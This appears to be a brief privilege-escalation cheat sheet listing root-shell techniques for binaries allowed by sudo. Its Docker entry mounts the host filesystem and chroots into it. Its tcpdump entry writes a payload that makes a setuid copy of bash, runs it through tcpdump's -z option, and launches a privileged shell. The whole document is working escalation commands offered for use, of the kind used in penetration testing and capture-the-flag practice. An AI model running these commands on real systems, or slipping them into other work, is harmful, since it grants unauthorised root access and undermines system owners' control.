## sudo -l
<details>
### Docker
`sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

### tcpdump
```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /tmp/payload.sh
chmod +x /tmp/payload.sh
sudo tcpdump -i lo -w /dev/null -W 1 -G 1 -z /tmp/payload.sh
/tmp/bash -p
```
</details>